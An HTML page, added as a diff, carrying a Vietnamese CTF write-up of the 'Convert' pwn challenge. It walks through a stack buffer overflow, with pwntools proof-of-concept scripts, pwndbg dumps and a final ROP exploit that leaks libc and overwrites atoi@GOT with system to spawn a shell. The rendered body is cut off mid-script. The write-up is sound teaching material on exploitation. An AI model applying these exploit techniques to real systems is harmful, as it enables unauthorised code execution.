@@ -1,0 +1,648 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Sơ khảo Sinh viên với An toàn thông tin 2022 | pivik</title>
+<meta name="keywords" content="">
+<meta name="description" content="Đây là lần thứ 2 mình tham gia Sinh viên với An toàn thông tin. Và mình khá vui vì lần này mình đã clear được pwn vòng sơ khảo (so với thành tích không làm được bài nào năm rồi hehe).
+Sau đây mình sẽ viết writeup về 1 bài pwn khá hay là Convert. Các binary với solve script mình sẽ để ở đây.
+Convert: Category: pwn Points: 498 Solves: 5 Description: Try my best!">
+<meta name="author" content="">
+<link rel="canonical" href="https://pivik271.github.io/posts/ascisquals2022/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.bc1149f4a72aa4858d3a9f71462f75e5884ffe8073ea9d6d5761d5663d651e20.css" integrity="sha256-vBFJ9KcqpIWNOp9xRi915YhP/oBz6p1tV2HVZj1lHiA=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://pivik271.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://pivik271.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://pivik271.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://pivik271.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://pivik271.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="Sơ khảo Sinh viên với An toàn thông tin 2022" />
+<meta property="og:description" content="Đây là lần thứ 2 mình tham gia Sinh viên với An toàn thông tin. Và mình khá vui vì lần này mình đã clear được pwn vòng sơ khảo (so với thành tích không làm được bài nào năm rồi hehe).
+Sau đây mình sẽ viết writeup về 1 bài pwn khá hay là Convert. Các binary với solve script mình sẽ để ở đây.
+Convert: Category: pwn Points: 498 Solves: 5 Description: Try my best!" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://pivik271.github.io/posts/ascisquals2022/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-10-18T11:39:14+07:00" />
+<meta property="article:modified_time" content="2022-10-18T11:39:14+07:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Sơ khảo Sinh viên với An toàn thông tin 2022"/>
+<meta name="twitter:description" content="Đây là lần thứ 2 mình tham gia Sinh viên với An toàn thông tin. Và mình khá vui vì lần này mình đã clear được pwn vòng sơ khảo (so với thành tích không làm được bài nào năm rồi hehe).
+Sau đây mình sẽ viết writeup về 1 bài pwn khá hay là Convert. Các binary với solve script mình sẽ để ở đây.
+Convert: Category: pwn Points: 498 Solves: 5 Description: Try my best!"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://pivik271.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Sơ khảo Sinh viên với An toàn thông tin 2022",
+      "item": "https://pivik271.github.io/posts/ascisquals2022/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Sơ khảo Sinh viên với An toàn thông tin 2022",
+  "name": "Sơ khảo Sinh viên với An toàn thông tin 2022",
+  "description": "Đây là lần thứ 2 mình tham gia Sinh viên với An toàn thông tin. Và mình khá vui vì lần này mình đã clear được pwn vòng sơ khảo (so với thành tích không làm được bài nào năm rồi hehe).\nSau đây mình sẽ viết writeup về 1 bài pwn khá hay là Convert. Các binary với solve script mình sẽ để ở đây.\nConvert: Category: pwn Points: 498 Solves: 5 Description: Try my best!",
+  "keywords": [
+    
+  ],
+  "articleBody": "Đây là lần thứ 2 mình tham gia Sinh viên với An toàn thông tin. Và mình khá vui vì lần này mình đã clear được pwn vòng sơ khảo (so với thành tích không làm được bài nào năm rồi hehe).\nSau đây mình sẽ viết writeup về 1 bài pwn khá hay là Convert. Các binary với solve script mình sẽ để ở đây.\nConvert: Category: pwn Points: 498 Solves: 5 Description: Try my best! Overview $ file convert convert: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, stripped $ checksec convert [*] '/home/pi/CTF/svattt/qual/pwn/convert/convert' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled Đề bài cho file binary đã bị strip (sẽ tốn nhiều thời gian để reverse hơn). Binary bật bit NX với PIE.\nHàm main sau khi mình đã chỉnh lại:\nĐầu tiên chương trình gọi hàm setup và in ra địa chỉ return address của hàm =\u003e Có được binary base.\nSau đó đọc input vào, input là 1 struct mình define như sau:\nstruct input { char ops[4]; char mode[4]; char data[48]; }; Tiếp theo thì allocate buffer cho biến p, có kiểu dữ liệu là 1 struct:\nstruct data { int ops; char mode[4]; char *data; struct data *next_data; }; Sau đó thì gọi hàm setup_data để gán data vào p.\nVà gọi hàm play_with_data.\nDựa vào mode thì sẽ vào hàm tương ứng, ở đây có 2 mode là hex_to_bin và bin_to_hex. Hai hàm này như tên gọi, cho phép ta chuyển đổi data từ hexadecimal sang binary và ngược lại.\nFinding the bug Trong hàm hex_to_bin, đầu tiên chương trình sẽ gọi hàm check:\nđể kiểm tra data có phải là 1 chuỗi hex không.\nSau đó, dựa vào p-\u003eops để tiếp tục chia ra thành các trường hợp.\nVới trường hợp p-\u003eops == 1, các node sẽ được liên kết bằng cách sử dụng singly linked list.\nCòn với trường hợp p-\u003eops == 0 thì sẽ traverse linked list để copy data vào mảng s.\nVà vấn đề xuất hiện từ đây, s là mảng 120 phần tử, nhưng ta cứ copy data từ các node vào mà không hề kiểm tra điều kiện, nên có thể gây ra lỗi stack buffer overflow.\nStack buffer overflow Mảng s nằm ở [rbp-0xc0] =\u003e Ta cần 0xc8 bytes để tới được return address. Mình viết 1 POC để trigger lỗi xem có ghi đè được return address của hàm hex_to_bin không.\nfrom pwn import * elf = ELF('./convert') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') p = process('./convert') def send_data(ops, mode, data): payload = flat({ 0: str(ops).encode(), 0x4: mode, 0x8: data }, filler = b'\\x00') sleep(0.01) p.send(payload) p.recvline() elf.address = u64(p.recvline()[:-1].ljust(8, b'\\x00')) - 0x1ada print(hex(elf.address)) send_data(1, b'htb', b'a'*0x30) send_data(1, b'htb', b'b'*0x30) send_data(1, b'htb', b'c'*0x30) send_data(1, b'htb', b'd'*0x30) send_data(0, b'htb', b'e'*0x30) p.interactive() Ở đây mình có 0x30*5 = 0xf0 bytes, là đủ để ghi đè return address. Nhưng khi mình chạy thử thì:\npwndbg\u003e Continuing. Program received signal SIGSEGV, Segmentation fault. 0x0000555555555519 in ?? () LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA ──────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────── RAX 0x6363636363636363 ('cccccccc') RBX 0x0 RCX 0x7fffffffde40 ◂— 0x6363636363636363 ('cccccccc') RDX 0x30 RDI 0x7fffffffde40 ◂— 0x6363636363636363 ('cccccccc') RSI 0x555555559380 ◂— 'cccccccccccccccccccccccccccccccccccccccccccccccc' R8 0x1999999999999999 R9 0x555555559440 ◂— 'eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee' R10 0x7ffff7f3bac0 (_nl_C_LC_CTYPE_toupper+512) ◂— 0x100000000 R11 0x7ffff7f96ce0 (main_arena+96) —▸ 0x555555559470 ◂— 0x0 R12 0x7fffffffe058 —▸ 0x7fffffffe39f ◂— './convert' R13 0x555555555ac1 ◂— push rbp R14 0x0 R15 0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f RBP 0x7fffffffdea0 —▸ 0x7fffffffded0 —▸ 0x7fffffffdf40 ◂— 0x1 RSP 0x7fffffffdbf0 ◂— 0x0 RIP 0x555555555519 ◂— mov rax, qword ptr [rax + 0x10] ───────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────── 0x55555555550c call memcpy@plt 0x555555555511 add dword ptr [rbp - 0x2c], 0x30 0x555555555515 mov rax, qword ptr [rbp - 0x38] ► 0x555555555519 mov rax, qword ptr [rax + 0x10] 0x55555555551d test rax, rax 0x555555555520 je 0x555555555530 \u003c0x555555555530\u003e ↓ 0x555555555530 nop 0x555555555531 mov rax, qword ptr [rbp - 0x2a8] 0x555555555538 mov rax, qword ptr [rax + 8] 0x55555555553c mov rdi, rax 0x55555555553f call strlen@plt ────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────── 00:0000│ rsp 0x7fffffffdbf0 ◂— 0x0 01:0008│ 0x7fffffffdbf8 —▸ 0x555555559420 ◂— 0x62746800000000 02:0010│ 0x7fffffffdc00 ◂— 0x0 ... ↓ 5 skipped ──────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────── ► f 0 0x555555555519 f 1 0x555555555a72 f 2 0x555555555b73 f 3 0x7ffff7da6d90 __libc_start_call_main+128 f 4 0x7ffff7da6e40 __libc_start_main+128 f 5 0x55555555510a ───────────────────────────────────────────────────────────────────────────────────────────────────────── pwndbg\u003e Chương trình lại crash ngay instruction mov rax, qword ptr [rax + 0x10]. Vậy chuyện gì đã xảy ra? Instruction đó ở ngay câu lệnh if ( !j-\u003enext_data ).\nNếu chúng ta xem lại vị trí các biến trong hàm hex_to_bin, thì [rbp-0x38] sẽ là vị trí của j. Có nghĩa là mình đã vô tình ghi đè j thành 1 giá trị rác. Vậy giờ mình chỉ cần thay j thành 1 giá trị hợp lý là được.\nfrom pwn import * elf = ELF('./convert') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') p = process('./convert') def send_data(ops, mode, data): payload = flat({ 0: str(ops).encode(), 0x4: mode, 0x8: data }, filler = b'\\x00') sleep(0.01) p.send(payload) p.recvline() elf.address = u64(p.recvline()[:-1].ljust(8, b'\\x00')) - 0x1ada print(hex(elf.address)) send_data(1, b'htb', b'a'*0x30) send_data(1, b'htb', b'b'*0x30) send_data(1, b'htb', b'c'*8 + p64(0)*4 + p64(elf.address + 0x4070)) send_data(1, b'htb', b'd'*0x30) send_data(0, b'htb', b'e'*0x30) p.interactive() Lần này thì chương trình sẽ crash ngay tại hàm memcpy.\n──────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────── RAX 0x555555559320 ◂— 'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb' RBX 0x0 RCX 0x800061613f71 RDX 0x30 *RDI 0x800061613f71 RSI 0x555555559320 ◂— 'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb' R8 0x1999999999999999 R9 0x555555559440 ◂— 'eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee' R10 0x7ffff7f3bac0 (_nl_C_LC_CTYPE_toupper+512) ◂— 0x100000000 R11 0x7ffff7f96ce0 (main_arena+96) —▸ 0x555555559470 ◂— 0x0 R12 0x7fffffffe058 —▸ 0x7fffffffe39f ◂— './convert' R13 0x555555555ac1 ◂— push rbp R14 0x0 R15 0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f RBP 0x7fffffffdea0 —▸ 0x7fffffffded0 —▸ 0x7fffffffdf40 ◂— 0x1 RSP 0x7fffffffdbf0 ◂— 0x0 *RIP 0x55555555550c ◂— call 0x555555555090 ───────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────── 0x5555555554f7 lea rcx, [rbp - 0xc0] 0x5555555554fe add rcx, rdx 0x555555555501 mov edx, 0x30 0x555555555506 mov rsi, rax 0x555555555509 mov rdi, rcx ► 0x55555555550c call memcpy@plt dest: 0x800061613f71 src: 0x555555559320 ◂— 'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb' n: 0x30 0x555555555511 add dword ptr [rbp - 0x2c], 0x30 0x555555555515 mov rax, qword ptr [rbp - 0x38] 0x555555555519 mov rax, qword ptr [rax + 0x10] 0x55555555551d test rax, rax 0x555555555520 je 0x555555555530 \u003c0x555555555530\u003e ────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────── 00:0000│ rsp 0x7fffffffdbf0 ◂— 0x0 01:0008│ 0x7fffffffdbf8 —▸ 0x555555559420 ◂— 0x62746800000000 02:0010│ 0x7fffffffdc00 ◂— 0x0 ... ↓ 5 skipped ──────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────── ► f 0 0x55555555550c f 1 0x555555555a72 f 2 0x555555555b73 f 3 0x7ffff7da6d90 __libc_start_call_main+128 f 4 0x7ffff7da6e40 __libc_start_main+128 f 5 0x55555555510a ───────────────────────────────────────────────────────────────────────────────────────────────────────── pwndbg\u003e Chương trình crash vì mình cũng đã ghi đè biến idx nằm ở [rbp-0x2c] thành 1 giá trị rác. Vậy mình cũng cần phải chỉnh lại giá trị của idx.\nfrom pwn import * elf = ELF('./convert') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') p = process('./convert') def send_data(ops, mode, data): payload = flat({ 0: str(ops).encode(), 0x4: mode, 0x8: data }, filler = b'\\x00') sleep(0.01) p.send(payload) p.recvline() elf.address = u64(p.recvline()[:-1].ljust(8, b'\\x00')) - 0x1ada print(hex(elf.address)) send_data(1, b'htb', b'a' + b'\\x00'*3 + p32(0xc0 - 0x30)) send_data(1, b'htb', b'b'*0x30) send_data(1, b'htb', b'c'*8 + p64(0)*4 + p64(elf.address + 0x4070)) send_data(1, b'htb', b'd'*0x30) send_data(0, b'htb', b'e'*0x30) p.interactive() Lúc này thì mình đã có thể điều khiển được luồng thực thi của chương trình.\n──────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────── RAX 0x0 RBX 0x0 RCX 0x7ffff7e91a37 (write+23) ◂— cmp rax, -0x1000 /* 'H=' */ RDX 0x1 RDI 0x7ffff7f98a70 (_IO_stdfile_1_lock) ◂— 0x0 RSI 0x1 R8 0x4 R9 0x555555559440 ◂— 'eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee' R10 0x7ffff7f3bac0 (_nl_C_LC_CTYPE_toupper+512) ◂— 0x100000000 R11 0x246 R12 0x7fffffffe058 —▸ 0x7fffffffe39f ◂— './convert' R13 0x555555555ac1 ◂— push rbp R14 0x0 R15 0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f RBP 0x6262626262626262 ('bbbbbbbb') RSP 0x7fffffffdea8 ◂— 'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbcccccccc' RIP 0x5555555556aa ◂— ret ───────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────── 0x555555555685 call puts@plt 0x55555555568a jmp 0x5555555556a2 \u003c0x5555555556a2\u003e ↓ 0x5555555556a2 mov eax, dword ptr [rbp - 0x14] 0x5555555556a5 mov rbx, qword ptr [rbp - 8] 0x5555555556a9 leave ► 0x5555555556aa ret \u003c0x6262626262626262\u003e ────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────── 00:0000│ rsp 0x7fffffffdea8 ◂— 'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbcccccccc' ... ↓ 4 skipped 05:0028│ 0x7fffffffded0 ◂— 'cccccccc' 06:0030│ 0x7fffffffded8 ◂— 0x0 07:0038│ 0x7fffffffdee0 ◂— 0x0 ──────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────── ► f 0 0x5555555556aa f 1 0x6262626262626262 f 2 0x6262626262626262 f 3 0x6262626262626262 f 4 0x6262626262626262 f 5 0x6262626262626262 f 6 0x6363636363636363 f 7 0x0 ───────────────────────────────────────────────────────────────────────────────────────────────────────── pwndbg\u003e Overwrite GOT Tới đây thì có nhiều hướng, mình chọn cách leak libc rồi overwrite atoi@GOT thành system.\nSau khi leak được libc thì mình return về địa chỉ binary base + 0x1aff\nđể ghi đè GOT.\nFinal script from pwn import * elf = ELF('./convert') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') p = process('./convert') def send_data(ops, mode, data): payload = flat({ 0: str(ops).encode(), 0x4: mode, 0x8: data }, filler = b'\\x00') sleep(0.01) p.send(payload) p.recvline() elf.address = u64(p.recvline()[:-1].ljust(8, b'\\x00')) - 0x1ada print(hex(elf.address)) pop_rdi = elf.address + 0x1c0b pop_rbp_r14_r15 = elf.address + 0x1c07 send_data(1, b'htb', b'a' + b'\\x00'*3 + p32(0xc0 - 0x30)) send_data(1, b'htb', b'b' + b'\\x00'*7 + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.sym['puts']) + p64(pop_rbp_r14_r15) + p64(elf.got['memcpy'] + 0x50)) send_data(1, b'htb', b'c'*8 + p64(0) + p64(pop_rdi + 1) + p64(elf.address + 0x1aff) + p64(0) + p64(elf.address + 0x4070)) send_data(1, b'htb', b'd'*0x30) send_data(0, b'htb', b'e'*0x30) libc.address = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\x00')) - libc.sym['puts'] print(hex(libc.address)) pause() p.send(b'/bin/sh\\x00' + p64(libc.sym['malloc']) + p64(libc.sym['system'])) p.interactive() Do lúc mình viết writeup thì server đã đóng nên mình chỉ có thể test lại trên local.\n$ python3 solve.py [*] '/home/pi/CTF/svattt/qual/pwn/convert/convert' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled [*] '/lib/x86_64-linux-gnu/libc.so.6' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Starting local process './convert': pid 27344 0x5562deef7000 0x7fde9a293000 [*] Paused (press any to continue) [*] Switching to interactive mode $ ls convert flag.txt gadgets.txt libc.so.6 solve.py $ cat flag.txt flag{test_flag} ",
+  "wordCount" : "1584",
+  "inLanguage": "en",
+  "datePublished": "2022-10-18T11:39:14+07:00",
+  "dateModified": "2022-10-18T11:39:14+07:00",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://pivik271.github.io/posts/ascisquals2022/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "pivik",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://pivik271.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://pivik271.github.io/" accesskey="h" title="pivik (Alt + H)">pivik</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://pivik271.github.io/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://pivik271.github.io/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title">
+      Sơ khảo Sinh viên với An toàn thông tin 2022
+    </h1>
+    <div class="post-meta"><span title='2022-10-18 11:39:14 +0700 +07'>October 18, 2022</span>
+
+</div>
+  </header> 
+  <div class="post-content"><p>Đây là lần thứ 2 mình tham gia Sinh viên với An toàn thông tin. Và mình khá vui vì lần này mình đã clear được pwn vòng sơ khảo (so với thành tích không làm được bài nào năm rồi hehe).</p>
+<p><img loading="lazy" src="/posts/ascisquals2022/img1.png" alt="img"  />
+</p>
+<p>Sau đây mình sẽ viết writeup về 1 bài pwn khá hay là <strong>Convert</strong>.
+Các binary với solve script mình sẽ để ở <a href="https://github.com/pivik271/ctf-writeups/tree/main/2022/svattt">đây</a>.</p>
+<h1 id="convert">Convert:<a hidden class="anchor" aria-hidden="true" href="#convert">#</a></h1>
+<ul>
+<li>Category: pwn</li>
+<li>Points: 498</li>
+<li>Solves: 5</li>
+<li>Description: Try my best!</li>
+</ul>
+<h2 id="overview">Overview<a hidden class="anchor" aria-hidden="true" href="#overview">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ file convert
+</span></span><span style="display:flex;"><span>convert: ELF 64-bit LSB pie executable, x86-64, version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>SYSV<span style="color:#f92672">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span style="color:#66d9ef">for</span> GNU/Linux 3.2.0, stripped
+</span></span><span style="display:flex;"><span>$ checksec convert
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/pi/CTF/svattt/qual/pwn/convert/convert&#39;</span>
+</span></span><span style="display:flex;"><span>    Arch:     amd64-64-little
+</span></span><span style="display:flex;"><span>    RELRO:    Partial RELRO
+</span></span><span style="display:flex;"><span>    Stack:    No canary found
+</span></span><span style="display:flex;"><span>    NX:       NX enabled
+</span></span><span style="display:flex;"><span>    PIE:      PIE enabled
+</span></span></code></pre></div><p>Đề bài cho file binary đã bị strip (sẽ tốn nhiều thời gian để reverse hơn). Binary bật bit NX với PIE.</p>
+<p>Hàm main sau khi mình đã chỉnh lại:</p>
+<p><img loading="lazy" src="/posts/ascisquals2022/img2.png" alt="img"  />
+</p>
+<p>Đầu tiên chương trình gọi hàm <code>setup</code> và in ra địa chỉ return address của hàm =&gt; Có được binary base.</p>
+<p><img loading="lazy" src="/posts/ascisquals2022/img3.png" alt="img"  />
+</p>
+<p>Sau đó đọc input vào, input là 1 struct mình define như sau:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> input {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> ops[<span style="color:#ae81ff">4</span>];
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> mode[<span style="color:#ae81ff">4</span>];
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> data[<span style="color:#ae81ff">48</span>];
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>Tiếp theo thì allocate buffer cho biến <code>p</code>, có kiểu dữ liệu là 1 struct:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> data {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> ops;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> mode[<span style="color:#ae81ff">4</span>];
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>data;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> data <span style="color:#f92672">*</span>next_data;
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>Sau đó thì gọi hàm <code>setup_data</code> để gán data vào <code>p</code>.</p>
+<p><img loading="lazy" src="/posts/ascisquals2022/img4.png" alt="img"  />
+</p>
+<p>Và gọi hàm <code>play_with_data</code>.</p>
+<p><img loading="lazy" src="/posts/ascisquals2022/img5.png" alt="img"  />
+</p>
+<p>Dựa vào mode thì sẽ vào hàm tương ứng, ở đây có 2 mode là <code>hex_to_bin</code> và <code>bin_to_hex</code>. Hai hàm này như tên gọi, cho phép ta chuyển đổi data từ hexadecimal sang binary và ngược lại.</p>
+<h2 id="finding-the-bug">Finding the bug<a hidden class="anchor" aria-hidden="true" href="#finding-the-bug">#</a></h2>
+<p>Trong hàm <code>hex_to_bin</code>, đầu tiên chương trình sẽ gọi hàm <code>check</code>:</p>
+<p><img loading="lazy" src="/posts/ascisquals2022/img6.png" alt="img"  />
+</p>
+<p>để kiểm tra data có phải là 1 chuỗi hex không.</p>
+<p><img loading="lazy" src="/posts/ascisquals2022/img7.png" alt="img"  />
+</p>
+<p>Sau đó, dựa vào <code>p-&gt;ops</code> để tiếp tục chia ra thành các trường hợp.</p>
+<p>Với trường hợp <code>p-&gt;ops == 1</code>, các node sẽ được liên kết bằng cách sử dụng singly linked list.</p>
+<p><img loading="lazy" src="/posts/ascisquals2022/img8.png" alt="img"  />
+</p>
+<p>Còn với trường hợp <code>p-&gt;ops == 0</code> thì sẽ traverse linked list để copy data vào mảng <code>s</code>.</p>
+<p><img loading="lazy" src="/posts/ascisquals2022/img9.png" alt="img"  />
+</p>
+<p>Và vấn đề xuất hiện từ đây, <code>s</code> là mảng 120 phần tử, nhưng ta cứ copy data từ các node vào mà không hề kiểm tra điều kiện, nên có thể gây ra lỗi <code>stack buffer overflow</code>.</p>
+<h2 id="stack-buffer-overflow">Stack buffer overflow<a hidden class="anchor" aria-hidden="true" href="#stack-buffer-overflow">#</a></h2>
+<p>Mảng <code>s</code> nằm ở <code>[rbp-0xc0]</code> =&gt; Ta cần <code>0xc8</code> bytes để tới được return address. Mình viết 1 POC để trigger lỗi xem có ghi đè được return address của hàm <code>hex_to_bin</code> không.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./convert&#39;</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span>)
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./convert&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_data</span>(ops, mode, data):
+</span></span><span style="display:flex;"><span>	payload <span style="color:#f92672">=</span> flat({
+</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0</span>: str(ops)<span style="color:#f92672">.</span>encode(),
+</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0x4</span>: mode,
+</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0x8</span>: data
+</span></span><span style="display:flex;"><span>	}, filler <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>
